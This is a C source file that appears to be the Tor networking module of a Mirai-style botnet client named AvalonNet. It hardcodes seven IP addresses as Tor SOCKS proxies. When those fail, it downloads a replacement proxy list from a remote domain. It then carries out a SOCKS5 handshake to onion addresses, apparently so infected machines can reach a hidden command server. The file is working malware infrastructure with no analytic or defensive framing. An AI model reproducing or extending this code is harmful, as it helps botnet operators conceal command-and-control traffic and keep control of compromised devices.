#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <string.h>
#include <stdio.h>
#include <stdint.h>

#include "headers/tor.h"
#include "headers/utils.h"
#include "headers/rand.h"
#include "headers/resolv.h"

static struct tor_proxy proxies[TOR_MAX_SOCKS];
static int proxies_len = 0;

void tor_init(void) {
    int i = 0;
    proxies[i++] = (struct tor_proxy){inet_addr("51.159.152.86"), htons(9050), 1};
    proxies[i++] = (struct tor_proxy){inet_addr("64.227.167.96"), htons(9050), 1};
    proxies[i++] = (struct tor_proxy){inet_addr("139.59.44.192"), htons(9050), 1};
    proxies[i++] = (struct tor_proxy){inet_addr("209.182.219.242"), htons(9050), 1};
    proxies[i++] = (struct tor_proxy){inet_addr("132.145.110.217"), htons(9050), 1};
    proxies[i++] = (struct tor_proxy){inet_addr("92.42.96.223"), htons(9050), 1};
    proxies[i++] = (struct tor_proxy){inet_addr("188.40.164.205"), htons(9050), 1};
    proxies_len = i;
}

static void tor_fetch_fresh_proxies(void) {
    int fd;
    struct sockaddr_in addr;
    char buffer[4096];
    struct resolv_entries *entries;

    entries = resolv_lookup("dcasdcas.online");
    if (entries == NULL) return;

    addr.sin_addr.s_addr = entries->addrs[0];
    resolv_entries_free(entries);

    if ((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1) return;

    addr.sin_family = AF_INET;
    addr.sin_port = htons(80);
    util_zero(addr.sin_zero, 8);

    if (connect(fd, (struct sockaddr *)&addr, sizeof(struct sockaddr)) == -1) {
        close(fd);
        return;
    }

    char *req = "GET /tortumama.txt HTTP/1.1\r\n"
                "Host: dcasdcas.online\r\n"
                "User-Agent: AvalonNet-Tor-Fetch\r\n"
                "Connection: close\r\n\r\n";

    send(fd, req, util_strlen(req), MSG_NOSIGNAL);

    int total_read = 0;
    while(total_read < sizeof(buffer) - 1) {
        int r = recv(fd, buffer + total_read, sizeof(buffer) - 1 - total_read, 0);
        if (r <= 0) break;
        total_read += r;
    }
    buffer[total_read] = 0;
    close(fd);

    if (total_read > 0) {
        int count = 0;
        char *ptr = buffer;
        int body_offset = util_stristr(buffer, total_read, "\r\n\r\n");
        if (body_offset != -1) ptr = buffer + body_offset + 4;

        char *line = strtok(ptr, "\n");
        while (line != NULL && count < TOR_MAX_SOCKS) {
            char *colon = strchr(line, ':');
            if (colon) {
                *colon = 0;
                char *ip_str = line;
                char *port_str = colon + 1;
                if (util_strlen(ip_str) > 6 && util_strlen(port_str) > 0) {
                     proxies[count].ip = inet_addr(ip_str);
                     proxies[count].port = htons(util_atoi(port_str, 10));
                     proxies[count].working = 1;
                     count++;
                }
            }
            line = strtok(NULL, "\n");
        }
        if (count > 0) proxies_len = count;
    }
}

static int full_recv(int fd, char *buf, int len) {
    int total = 0;
    while (total < len) {
        int r = recv(fd, buf + total, len - total, MSG_NOSIGNAL);
        if (r <= 0) return -1;
        total += r;
    }
    return total;
}

int tor_socks5_handshake(int fd, const char *onion_addr, uint16_t port) {
    uint8_t buf[512];

    buf[0] = 0x05; buf[1] = 0x01; buf[2] = 0x00;
    if (send(fd, buf, 3, MSG_NOSIGNAL) != 3) return -1;
    if (full_recv(fd, (char *)buf, 2) != 2) return -1;
    if (buf[1] != 0x00) return -1;

    uint8_t onion_len = (uint8_t)strlen(onion_addr);
    buf[0] = 0x05; buf[1] = 0x01; buf[2] = 0x00; buf[3] = 0x03;
    buf[4] = onion_len;
    util_memcpy(buf + 5, (void *)onion_addr, onion_len);
    uint16_t net_port = htons(port);
    util_memcpy(buf + 5 + onion_len, &net_port, 2);

    if (send(fd, buf, 7 + onion_len, MSG_NOSIGNAL) != (7 + onion_len)) return -1;

    if (full_recv(fd, (char *)buf, 4) != 4) return -1;
    if (buf[1] != 0x00) return -1;

    int addr_len = 0;
    if (buf[3] == 0x01) addr_len = 4 + 2;
    else if (buf[3] == 0x03) {
        if (full_recv(fd, (char *)&addr_len, 1) != 1) return -1;
        addr_len += 2;
    }
    else if (buf[3] == 0x04) addr_len = 16 + 2;

    if (addr_len > 0) {
        char garbage[256];
        if (full_recv(fd, garbage, addr_len) != addr_len) return -1;
    }

    return 0;
}

struct tor_proxy *tor_get_random(void) {
    int i, working_count = 0;
    for (i = 0; i < proxies_len; i++) if (proxies[i].working) working_count++;

    if (working_count == 0) {
        tor_fetch_fresh_proxies();
        working_count = 0;
        for (i = 0; i < proxies_len; i++) if (proxies[i].working) working_count++;
        if (working_count == 0) {
            for (i = 0; i < proxies_len; i++) proxies[i].working = 1;
            working_count = proxies_len;
        }
    }

    if (proxies_len == 0) return NULL;
    int attempts = 0;
    while (attempts < 100) {
        int idx = rand_next() % proxies_len;
        if (proxies[idx].working) return &proxies[idx];
        attempts++;
    }
    return &proxies[0];
}

void tor_report_working(struct tor_proxy *proxy, int is_working) {
    if (proxy != NULL) proxy->working = is_working;
}
